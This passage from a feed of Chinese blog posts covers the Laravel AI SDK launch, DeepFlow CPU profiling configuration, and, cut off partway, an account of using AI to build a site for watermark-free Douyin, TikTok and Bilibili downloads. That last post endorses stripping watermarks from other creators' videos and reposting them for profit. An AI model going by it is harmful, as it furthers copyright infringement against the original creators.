      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19567163\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 07:40\">\n    <span>Laravel AI SDK 在 Laracon India 2026 首次亮相</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"laravel-ai-sdk-在-laracon-india-2026-首次亮相\">Laravel AI SDK 在 Laracon India 2026 首次亮相</h1>\n<p>2026 年 1 月 31 日，Taylor Otwell 在 Laracon India 2026 上首次公开展示了 Laravel AI SDK。这套他已开发数月的全新工具集，有望彻底改变 Laravel 应用中的 AI 集成方式。</p>\n<h2 id=\"什么是-laravel-ai-sdk\">什么是 Laravel AI SDK？</h2>\n<p>Laravel AI SDK 旨在大幅简化与各类 AI 服务商的交互，支持以下操作：</p>\n<ul>\n<li>获取类似 ChatGPT 的聊天机器人响应</li>\n<li>通过 embeddings 实现数据库语义搜索</li>\n<li>生成视频、音频和转录文本</li>\n<li>以及更多功能</li>\n</ul>\n<p>Taylor Otwell 的目标是提供优雅的 Laravel 语法和简洁的 API，无论你选择哪个 AI 服务商。实际使用时，只需调用 <code>agent()-&gt;prompt('你的请求...')</code> 即可获得结果。</p>\n<h2 id=\"配置-ai-服务商\">配置 AI 服务商</h2>\n<p>配置过程非常简单。在 <code>config/ai.php</code> 文件中，你可以为不同的服务商配置 API 密钥，如 Anthropic、OpenAI、Cohere、ElevenLabs 或 Gemini。</p>\n<p>SDK 还允许根据操作类型设置默认服务商：</p>\n<ul>\n<li><code>default</code> → openai</li>\n<li><code>default_for_images</code> → gemini</li>\n<li><code>default_for_audio</code> → openai</li>\n<li><code>default_for_transcription</code> → openai</li>\n<li><code>default_for_embeddings</code> → openai</li>\n<li><code>default_for_reranking</code> → cohere</li>\n</ul>\n<h2 id=\"基础用法调用-agent\">基础用法：调用 Agent</h2>\n<p>最简单的示例展示了这种极简方式的强大：</p>\n<pre><code class=\"language-php\">Route::get('/agent', function () {\n    $response = agent(\n        instructions: 'You are a helpful assistant.'\n    )-&gt;prompt('Tell me about Laravel in one sentence.');\n});\n</code></pre>\n<p>响应返回包含调用元数据的完整结构，包括使用的 token 数、服务商、模型，当然还有响应内容。</p>\n<h2 id=\"jsonschema-自定义数据结构\">JsonSchema 自定义数据结构</h2>\n<p>你可以通过提供 JSON Schema 精确定义返回结果的格式。这让你能够获得可直接在应用中使用的结构化数据。</p>\n<h2 id=\"队列处理与流式响应\">队列处理与流式响应</h2>\n<p>由于 LLM 响应可能需要一些时间，SDK 提供了两种优雅的选项：</p>\n<ul>\n<li><strong>队列处理</strong>：将请求委托给 Laravel Job</li>\n<li><strong>流式响应</strong>：逐字显示响应，就像传统聊天机器人一样</li>\n</ul>\n<p>这种灵活性与现有的 Laravel 生态系统完美集成。</p>\n<h2 id=\"图像生成\">图像生成</h2>\n<p>Laravel 的「开箱即用」理念在这里体现得淋漓尽致。你可以将 AI SDK 的新功能与 Laravel 现有功能（如队列和文件系统）结合使用。</p>\n<p>生成图像变得如此简单：</p>\n<pre><code class=\"language-php\">agent()-&gt;generateImage('prompt here')-&gt;store('path');\n</code></pre>\n<p>你甚至可以通过添加新的 AI 提示词来修改现有图像。</p>\n<h2 id=\"音频与转录\">音频与转录</h2>\n<p>与图像类似，SDK 允许通过 ElevenLabs 等服务商处理音频，无论是生成音频还是转录现有内容。</p>\n<h2 id=\"embeddings-与语义搜索\">Embeddings 与语义搜索</h2>\n<p>最令人印象深刻的功能之一是在项目中实现语义搜索的便捷性。</p>\n<p>例如，搜索 \"big boats\" 可以找到电影 \"Titanic\"，即使其描述中没有包含 \"boat\" 这个词。这就是 embeddings 的魔力。</p>\n<p>虽然底层实现复杂，但控制器端的代码依然简洁优雅。这个功能配合 PostgreSQL 效果最佳，因为 PostgreSQL 具有原生向量搜索功能，已在 Laravel 12 中新增支持。</p>\n<h2 id=\"agent-类\">Agent 类</h2>\n<p>SDK 将支持通过命令生成专用的 Agent 类：</p>\n<pre><code class=\"language-shell\">php artisan make:agent\n</code></pre>\n<p>这些类提供了丰富的配置选项，比如 <code>UseCheapestModel</code> 属性可以自动选择各服务商最经济的模型（haiku、nano 等）。</p>\n<p>Taylor 还展示了其他可配置的功能：</p>\n<ul>\n<li>Middleware</li>\n<li>自定义配置</li>\n<li>数据结构</li>\n<li>带 Schema 的工具</li>\n<li>网页搜索</li>\n</ul>\n<h2 id=\"发布计划\">发布计划</h2>\n<p>Laravel AI SDK 计划于本周四正式发布。这套全新工具集有望让 Laravel 应用中的 AI 集成变得像框架的其他部分一样简单优雅。</p>\n<p>这次演示再次证明了 Laravel 生态系统适应新技术的能力，同时保持其核心理念：让 Web 开发变得愉快且高效！</p>\n<p><a href=\"https://catchadmin.com/post/2026-02/laravel-ai-sdk\" rel=\"noopener nofollow\" target=\"_blank\">Laravel AI SDK 在 Laracon India 2026 首次亮相</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 07:40</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">17</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "通过 DeepFlow 查询函数在 CPU 上消耗的时间（CPU 性能剖析）",
      "link": "https://www.cnblogs.com/manuscript/p/19565142",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/manuscript/p/19565142\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 05:07\">\n    <span>通过 DeepFlow 查询函数在 CPU 上消耗的时间（CPU 性能剖析）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"前言\">前言</h1>\n<p>本文主要介绍 DeepFlow 的 AutoProfiling（on-cpu）持续性能剖析功能的配置与使用。该能力与 DeepFlow 的部署方式无关。自 v6.6.3 起，deepflow-agent 的配置格式有较大调整，本文使用新版本配置格式，建议使用 v7.0 LTS 或后续 LTS 版本。</p>\n<h1 id=\"cpu-剖析的配置与应用\">CPU 剖析的配置与应用</h1>\n<h2 id=\"前置条件\">前置条件</h2>\n<p>需要内核版本支持 eBPF 能力，DeepFlow 中开启 eBPF 能力（默认开启）所需内核版本要求如下：</p>\n<table>\n<thead>\n<tr>\n<th>体系架构</th>\n<th>发行版</th>\n<th>内核版本</th>\n<th>kprobe [1]</th>\n<th>Golang uprobe</th>\n<th>OpenSSL uprobe</th>\n<th>perf</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>X86</td>\n<td>CentOS 7.9</td>\n<td>3.10.0-940+ <strong>[2]</strong></td>\n<td>Y</td>\n<td>Y <strong>[3]</strong></td>\n<td>Y <strong>[3]</strong></td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>RedHat 7.6</td>\n<td>3.10.0-940+ <strong>[2]</strong></td>\n<td>Y</td>\n<td>Y <strong>[3]</strong></td>\n<td>Y <strong>[3]</strong></td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>*</td>\n<td>4.14 <strong>[4]</strong></td>\n<td>Y</td>\n<td>Y <strong>[3]</strong></td>\n<td>-</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>*</td>\n<td>4.15</td>\n<td>Y</td>\n<td>Y <strong>[3]</strong></td>\n<td>-</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>*</td>\n<td>4.16</td>\n<td>Y</td>\n<td>Y</td>\n<td>-</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>*</td>\n<td>4.17+</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>SUSE 12 SP5</td>\n<td>4.12 [5]</td>\n<td>Y</td>\n<td>Y</td>\n<td>-</td>\n<td>Y</td>\n</tr>\n<tr>\n<td>ARM</td>\n<td>CentOS 8</td>\n<td>4.18</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>EulerOS</td>\n<td>5.10+</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>麒麟 KylinOS V10 SP1</td>\n<td>4.19.90-23 [6]</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>麒麟 KylinOS V10 SP2</td>\n<td>4.19.90-25.24+ [7]</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>麒麟 KylinOS V10 SP3</td>\n<td>4.19.90-52.24+</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n<tr>\n<td></td>\n<td>其他发行版</td>\n<td>5.8+</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n<td>Y</td>\n</tr>\n</tbody>\n</table>\n<p>对内核版本的补充说明：</p>\n<ul>\n<li>[1]：在 Linux 启用了 BTF（BPF Type Format）的情况下，X86 架构内核版本大于等于 <a href=\"https://github.com/torvalds/linux/commit/f1b9509c2fb0ef4db8d22dac9aef8e856a5d81f6\" rel=\"noopener nofollow\" target=\"_blank\">5.5</a>、ARM 架构内核版本大于等于 <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?h=linux-6.0.y&amp;id=efc9909fdce00a827a37609628223cd45bf95d0b\" rel=\"noopener nofollow\" target=\"_blank\">6.0</a> 时，agent 将自动使用 fentry/fexit 替代 kprobe/kretprobe，可获得约 15% 的性能提升。</li>\n<li>[2]：CentOS 7.9、RedHat 7.6 向 3.10 内核中<a href=\"https://www.redhat.com/en/blog/introduction-ebpf-red-hat-enterprise-linux-7\" rel=\"noopener nofollow\" target=\"_blank\">移植了一部分 eBPF 能力</a>。\n<ul>\n<li>在这两个发行版中，DeepFlow 支持的详细内核版本如下（<a href=\"https://github.com/deepflowio/deepflow/blob/main/agent/src/ebpf/docs/probes-and-maps.md\" rel=\"noopener nofollow\" target=\"_blank\">依赖的 Hook 点</a>）：\n<ul>\n<li>3.10.0-957.el7.x86_64</li>\n<li>3.10.0-1062.el7.x86_64</li>\n<li>3.10.0-1127.el7.x86_64</li>\n<li>3.10.0-1160.el7.x86_64</li>\n</ul>\n</li>\n<li>注意 RedHat 的声明：\n<blockquote>\n<p>The eBPF in Red Hat Enterprise Linux 7.6 is provided as Tech Preview and thus doesn't come with full support and is not suitable for deployment in production. It is provided with the primary goal to gain wider exposure, and potentially move to full support in the future. eBPF in Red Hat Enterprise Linux 7.6 is enabled only for tracing purposes, which allows attaching eBPF programs to probes, tracepoints and perf events.</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>[3]：容器内的 Golang/OpenSSL 进程不支持。</li>\n<li>[4]：在内核 4.14 中，一个 tracepoint 不能被多个 eBPF program attach（例如不能同时运行两个或多个 deepflow-agent）。其他版本不存在该问题。</li>\n<li>[5]：目前支持 SUSE 12 SP5 4.12.14，但 Linux 社区的 4.12 版本依然不支持。</li>\n<li>[6]：KylinOS V10 SP1 部分内核（例如 4.19.90-23.48.v2101.ky10.aarch64）可正常运行，但不确保 KylinOS V10 SP1 所有 aarch64 架构内核都能正常运行 deepflow-agent。</li>\n<li>[7]：KylinOS V10 SP2 某些内核（如 4.19.90-24.4.v2101.ky10.aarch64）由于不支持 <code>bpf_probe_read_user()</code>，无法读取用户态数据，因此不支持 AutoTracing；但支持持续剖析和文件读写追踪功能。</li>\n</ul>\n<h2 id=\"支持语言\">支持语言</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>支持语言/库</th>\n<th>社区版</th>\n<th>企业版</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>on-cpu</td>\n<td>Java</td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>C/C++</td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Rust</td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Golang</td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Python <code>***</code></td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>CUDA</td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Lua <code>*</code></td>\n<td>✔</td>\n<td>✔</td>\n</tr>\n<tr>\n<td>off-cpu</td>\n<td>Java</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>C/C++</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Rust</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Golang</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Python <code>***</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>CUDA</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Lua <code>*</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td>on-gpu</td>\n<td>CUDA <code>*</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td>mem-alloc</td>\n<td>Java <code>**</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Rust</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Golang <code>*</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td></td>\n<td>Python <code>*</code> <code>***</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td>mem-inuse</td>\n<td>Rust</td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td>hbm-alloc</td>\n<td>CUDA <code>*</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td>hbm-inuse</td>\n<td>CUDA <code>*</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n<tr>\n<td>rdma</td>\n<td>C/C++ <code>*</code></td>\n<td></td>\n<td>✔</td>\n</tr>\n</tbody>\n</table>\n<p>说明：</p>\n<ul>\n<li><code>*</code>：开发中的功能（尚未正式发布）</li>\n<li><code>**</code>：运行 Java 程序的 JVM 必须包含符号表，参考下文的 JVM 符号表检查</li>\n<li><code>***</code>：当前支持版本为 Python 3.10</li>\n<li>语言分类：\n<ul>\n<li>编译为 ELF 格式可执行文件的语言：Golang、Rust、C/C++</li>\n<li>使用 JVM 虚拟机的语言：Java</li>\n<li>解释型语言：Python</li>\n</ul>\n</li>\n</ul>\n<p>获取 Profiling 数据需满足两个前提条件：</p>\n<ul>\n<li>应用进程需要开启 Frame Pointer，或启用 Agent 的 DWARF 栈回溯能力\n<ul>\n<li>应用进程开启 Frame Pointer（帧指针寄存器）：\n<ul>\n<li>编译 C/C++：<code>gcc -fno-omit-frame-pointer</code></li>\n<li>编译 Rust：<code>RUSTFLAGS=\"-C force-frame-pointers=yes\"</code></li>\n<li>编译 Golang：默认开启，无需额外编译参数</li>\n<li>运行 Java：<code>-XX:+PreserveFramePointer</code>\n<ul>\n<li>开启该参数会禁用某些编译器优化，不过根据 <a href=\"https://netflixtechblog.com/java-in-flames-e763b3d32166\" rel=\"noopener nofollow\" target=\"_blank\">Netflix</a> 和 <a href=\"https://www.brendangregg.com/FlameGraphs/cpuflamegraphs.html\" rel=\"noopener nofollow\" target=\"_blank\">Brendan Gregg</a> 的实测结果，通常只会引入 &lt;1% 的性能损耗。Netflix 早在 2015 年起已在生产环境大规模使用，以支撑其 Java 程序的日常性能分析。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>启用 Agent 的 DWARF 栈回溯能力请参考<a href=\"https://www.deepflow.io/docs/zh/configuration/agent/#inputs.ebpf.profile.unwinding\" rel=\"noopener nofollow\" target=\"_blank\">文档</a></li>\n</ul>\n</li>\n<li>对于编译型语言的应用进程，编译时需要注意保留符号表</li>\n</ul>\n<h3 id=\"jvm-符号表检查\">JVM 符号表检查</h3>\n<pre><code class=\"language-bash\"># 1) 查找需要进行内存剖析的 Java 进程号，记为 $pid\n\n# 2) 查看进程加载的 libjvm.so 所在位置，记为 $path\ngrep libjvm.so /proc/$pid/maps\n\n# 3) 检查该文件是否包含符号表\nreadelf -WS $path | grep symtab\n</code></pre>\n<h2 id=\"配置方式\">配置方式</h2>\n<p>配置前需要注意：<a href=\"https://github.com/deepflowio/deepflow/blob/main/agent/config/deepflow-agent.yaml\" rel=\"noopener nofollow\" target=\"_blank\" title=\"deepflow-agent\">deepflow-agent</a> 的 ConfigMap 仅用于 agent 向 server 注册；而下方的 agent 自身配置需要通过 <a href=\"https://www.deepflow.io/docs/zh/best-practice/agent-advanced-config/\" rel=\"noopener nofollow\" target=\"_blank\" title=\"deepflow-ctl\">deepflow-ctl</a> 下发。</p>\n<blockquote>\n<p>注：CPU 剖析还有一些未出现在下方示例中的参数。如果你不确定修改后会产生什么影响，建议保持默认值。</p>\n</blockquote>\n<pre><code class=\"language-yaml\">inputs:\n  proc:\n    enabled: true\n    process_matcher:\n      # 功能列表，默认开关参考链接中的详细描述：\n      # https://www.deepflow.io/docs/zh/configuration/agent/#inputs.proc.process_matcher.enabled_features\n      - enabled_features:\n          - ebpf.profile.on_cpu\n          - proc.gprocess_info\n        # Rust 正则规则：\n        # https://regex101.com/\n        match_regex: \\bjava( +\\S+)* +-jar +(\\S*/)*([^ /]+\\.jar)\n        # 匹配形式，参考详细描述：\n        # https://www.deepflow.io/docs/zh/configuration/agent/#inputs.proc.process_matcher\n        match_type: cmdline_with_args\n        # 是否仅匹配容器内的进程：\n        # https://www.deepflow.io/docs/zh/configuration/agent/#inputs.proc.process_matcher.only_in_container\n        only_in_container: false\n        # 将匹配到的第三段 ([^ /]+\\.jar) 内容作为名称（一般为 jar 包名）\n        # 例如：shop-web-0.0.1-SNAPSHOT.jar\n        rewrite_name: $3\n      - enabled_features:\n          - ebpf.profile.on_cpu\n          - proc.gprocess_info\n          - proc.socket_list\n        match_regex: ^(cartservice|checkoutservice|shippingservice|coredns|mysqld|deepflow-server|deepflow-agent|stress-ng|cpu-demo)\n        only_in_container: false\n</code></pre>\n<h2 id=\"校验结果\">校验结果</h2>\n<ol>\n<li>\n<p>查看当前的 Java Demo PID</p>\n<pre><code class=\"language-bash\">root@ce-demo-1:~# kubectl get pods -n deepflow-otel-spring-demo web-shop-7c48fd68dc-szchh -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP               NODE        NOMINATED NODE   READINESS GATES\nweb-shop-7c48fd68dc-szchh   1/1     Running   0          83d   10.244.228.165   ce-demo-2   &lt;none&gt;           &lt;none&gt;\n\nroot@ce-demo-1:~# kubectl exec -n deepflow-otel-spring-demo web-shop-7c48fd68dc-szchh -c web-shop -- ps aux\nPID   USER     TIME  COMMAND\n  1   root     0:00  sh /home/docker-entrypoint.sh -javaagent:/sidecar/agent/opentelemetry-javaagent.jar -Dotel.resource.attributes=service.name=shop-web -Dotel.traces.exporter=otlp -Dotel.metrics.exporter=none -jar /home/shop-web-0.0.1-SNAPSHOT.jar\n  7   root     1d13  java -javaagent:/sidecar/agent/opentelemetry-javaagent.jar -Dotel.resource.attributes=service.name=shop-web -Dotel.traces.exporter=otlp -Dotel.metrics.exporter=none -jar /home/shop-web-0.0.1-SNAPSHOT.jar\n\nroot@ce-demo-1:~# ssh ce-demo-2 'ps aux | grep shop-web-0.0.1-SNAPSHOT.jar'\nroot     2684642  2.0  2.4 8348252 406656 ?      Sl    2025 2430:21 java -javaagent:/sidecar/agent/opentelemetry-javaagent.jar -Dotel.resource.attributes=service.name=shop-web -Dotel.traces.exporter=otlp -Dotel.metrics.exporter=none -jar /home/shop-web-0.0.1-SNAPSHOT.jar\n</code></pre>\n</li>\n<li>\n<p>在 ClickHouse 中通过上一步的 PID 查询 DeepFlow 标签信息</p>\n<pre><code class=\"language-sql\">root@ce-demo-1:~# kubectl exec -it -n deepflow deepflow-clickhouse-0 -c clickhouse -- bash\nroot@deepflow-clickhouse-0:/# clickhouse client\nClickHouse client version 23.10.4.25 (official build).\nConnecting to localhost:9000 as user default.\nConnected to ClickHouse server version 23.10.4 revision 54466.\n\ndeepflow-clickhouse-0.deepflow-clickhouse-headless.deepflow.svc.cluster.local :)\n\n-- 通过 PID 查询对应进程在 DeepFlow 中的 tag 信息\nSELECT gprocess_id, app_service\nFROM `profile`.`in_process`\nWHERE process_id = 2684642\nLIMIT 1;\n\n┌─gprocess_id─┬─app_service─┐\n│         123 │ java        │\n└─────────────┴─────────────┘\n\n-- 通过 gprocess_id 查询 rewrite_name 是否生效\nSELECT *\nFROM `flow_tag`.`gprocess_map`\nWHERE id = 123\nLIMIT 1;\n\n┌──id─┬─name────────────────────────┬─icon_id─┬─chost_id─┬─l3_epc_id─┬─team_id─┬─domain_id─┬─sub_domain_id─┐\n│ 123 │ shop-web-0.0.1-SNAPSHOT.jar │       0 │        2 │         1 │       1 │         1 │             0 │\n└─────┴─────────────────────────────┴─────────┴──────────┴───────────┴─────────┴───────────┴───────────────┘\n</code></pre>\n</li>\n<li>\n<p>查看 Continuous Profiling Dashboard 中对应 Demo 的剖析效果</p>\n<p><img alt=\"img_v3_02uh_57e28e17-0461-40f0-80ff-04c08ff61a2g\" src=\"https://img2024.cnblogs.com/blog/3735354/202602/3735354-20260202154119936-1275480608.png\" /></p>\n<p>字段说明：</p>\n<ul>\n<li>auto_service：举例说明，目前业务部署方式为 Deployment，此处依据 k8s svc name &gt; deployment name 填写</li>\n</ul>\n</li>\n<li>\n<p>函数类型对应关系</p>\n<table>\n<thead>\n<tr>\n<th>Function Type</th>\n<th>含义</th>\n<th>Profile Event Type</th>\n<th>特征</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>O</td>\n<td>对象类型</td>\n<td><code>mem-*</code></td>\n<td>Memory Profile 的叶子节点</td>\n</tr>\n<tr>\n<td>H</td>\n<td>云主机</td>\n<td><code>*</code></td>\n<td>等于 <code>Total</code> 的根节点</td>\n</tr>\n<tr>\n<td>P</td>\n<td>进程</td>\n<td><code>*</code></td>\n<td>以 <code>[p]</code> 开头，且不等于 <code>Total</code> 的根节点</td>\n</tr>\n<tr>\n<td>T</td>\n<td>线程</td>\n<td><code>*</code></td>\n<td>以 <code>[t]</code> 开头</td>\n</tr>\n<tr>\n<td>K</td>\n<td>内核函数</td>\n<td><code>*</code></td>\n<td>以 <code>[k]</code> 开头</td>\n</tr>\n<tr>\n<td>C</td>\n<td>CUDA 驱动函数</td>\n<td><code>*</code></td>\n<td>以 <code>[c]</code> 开头</td>\n</tr>\n<tr>\n<td>L</td>\n<td>动态链接库函数</td>\n<td><code>*</code></td>\n<td>以 <code>[l]</code> 开头</td>\n</tr>\n<tr>\n<td>?</td>\n<td>未知函数</td>\n<td><code>*</code></td>\n<td>其他以 <code>[</code> 开头</td>\n</tr>\n<tr>\n<td>A</td>\n<td>应用函数</td>\n<td><code>*</code></td>\n<td>除以上之外的函数</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>通过 API 查询数据</p>\n<p>参考 DeepFlow <a href=\"https://www.deepflow.io/docs/zh/features/continuous-profiling/data/#api\" rel=\"noopener nofollow\" target=\"_blank\" title=\"官方文档\">官方文档</a>中 API 的使用方式。</p>\n</li>\n</ol>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 05:07</span>&nbsp;\n<a href=\"https://www.cnblogs.com/manuscript\">怎么还在写代码</a>&nbsp;\n阅读(<span id=\"post_view_count\">20</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "细节全公开！我是如何用 AI 一天上线一个网站的",
      "link": "https://www.cnblogs.com/zh94/p/19566786",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zh94/p/19566786\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 00:10\">\n    <span>细节全公开！我是如何用 AI 一天上线一个网站的</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>2026 年刚开年，Trae 就给每个用户都发了 600 积分，还没领到的朋友，抓紧去 Trae.ai 的官网快快去领取吧。【非广告，热心博主，纯提醒🐶】</p>\n<p>领到了 600 积分后，大概一个月的时间就过期了，所以趁着积分还热乎，就用 Trae 的 Gemini-3-Pro 模型和 GPT-5.2 模型给自己写了一个新的网站。</p>\n<p>接下来我会把网站的开发细节，以及 UI 是如何设计如此精美的，都给大家分享出来，相信对于大多数的读者来说，这将是一个非常不错的经验包。</p>\n<p>文章快速阅读只需两分钟，读完以后，你的经验值就会快速 +1 +1</p>\n<h1 id=\"文章开始先介绍背景\">文章开始，先介绍背景</h1>\n<p>前几天跟一个朋友聊天的时候，聊到了视频剪辑这个领域，他现在在做的业务就是国内外各种短剧分销和视频搬运。</p>\n<p>先解释一下短剧分销这个概念：在国内的平台上，抖音、快手、好看视频、B 站等一线平台，都上线的有短剧分销的功能。</p>\n<p>简单来说，就是你把这个短剧的高光时刻发布到短视频平台上，用户在看到这个视频激动不已的时候，就会点击购买视频全集，此时用户的购买费用，就会有<br />\n一部分转移到了这个视频的作者手上。</p>\n<p>想要参与短剧分销就必须有 MCN 的资质才行，对于小型的 MCN 机构来说，如果每一个短剧上线后，都自己一个一个来剪辑高光时刻的小视频，成本是相对较高的。</p>\n<p>所以他们会有一个普遍的玩法，就是直接下载别人的视频，然后发布到自己的账号矩阵上。从而快速获取流量，然后进行盈利。</p>\n<p>举个例子：你看到抖音这个短剧小视频剪辑的非常不错，热度也很高，那你就直接把该视频下载下来。去除水印后，添加一些特殊的动效，改变视频原比例等操作。</p>\n<p>直接发布到自己其他平台的账矩阵上就行，以此来进行盈利。</p>\n<p>这里涉及到两个动作：</p>\n<p>第一：你如何在各个平台上下载一个无水印版的原视频。</p>\n<p>第二：能否将该原视频改变比例，增加特效这个操作，直接 AI 一键完成。而不是还需要人工进行参与。</p>\n<p>于是乎，本来Trae 的 600 积分到手后，自己正想着如何消耗掉呢，和这位朋友聊完，<strong>我就用了周末一天时间把这个网站给 Vibe Coding 出来了。</strong></p>\n<h1 id=\"先看网站效果\">先看网站效果</h1>\n<p>主要分为五个模块：</p>\n<p>一：抖音无水印视频下载</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235426531-1053932813.png\" /></p>\n<p>我们直接将抖音链接输入到网站上，然后点击新窗口打开视频，即可下载该视频的无水印版本。</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235441498-332666344.png\" /></p>\n<p>二：TikTok无水印视频下载</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235448344-1577323153.png\" /></p>\n<p>三：B 站无水印视频下载</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235454663-1817359072.png\" /></p>\n<p>四： <strong>AI 智能修剪，可以一键将你所上传的视频，直接进行智能裁剪；</strong></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235501394-242268660.png\" /></p>\n<p>目前支持直接采集视频比例，以及色彩增强，智能去噪，和音频微调功能</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235511484-994071418.png\" /></p>\n<h1 id=\"接下来我们开始正式拆解\">接下来我们开始正式拆解</h1>\n<p>首先，必须的必的就是：计划先行！千万不要直接让AI直接给你干代码！</p>\n<p>切记，对于这些顶尖模型，写代码对与他来说都是最简单的事情，但是一旦计划没对应起来，代码前面给你写糟糕了，你后面再让他来来回回修改，是非常的浪费时间的。</p>\n<p>所以，一定要计划先行！</p>\n<p>我们先把上面想要实现的这些初步需求，直接用 Solo Code 的 Plan 模式，全部丢给 AI，让他罗列一个实现计划。</p>\n<p>核心步骤是：</p>\n<p>一：让他自行调研如何实现抖音、TikTok、B 站这三个平台的视频下载无水印功能。并让他输出技术文档。</p>\n<p>二：让他调研如何实现网站在线的视频剪辑功能。并让他输出技术文档。</p>\n<p>三：让他自行写一个网站的功能列表，实现我们想要的需求，需要有哪些菜单和功能，并让他输出一个设计文档。</p>\n<p>四：让他制定测试计划，这里我们自行找到一个抖音的视频链接、TikTok 的视频链接，B 站的视频链接，作为他的测试用例，让他后续开发完成功能后，自行基于该测试用例，进行测试。</p>\n<p>这四个事项的文档确认完以后，其实已经可以让他实现自闭环了，自己开发功能自己进行测试。</p>\n<p>这里有一个注意事项是，Solo Code 模式支持 Sub Agent，我们这里直接把 Trae 官网推荐的一些 Agent 全部给加到自己的模块当中，这样 Solo Code 会在需要的时候自主调用架构 Agent、前端 UI 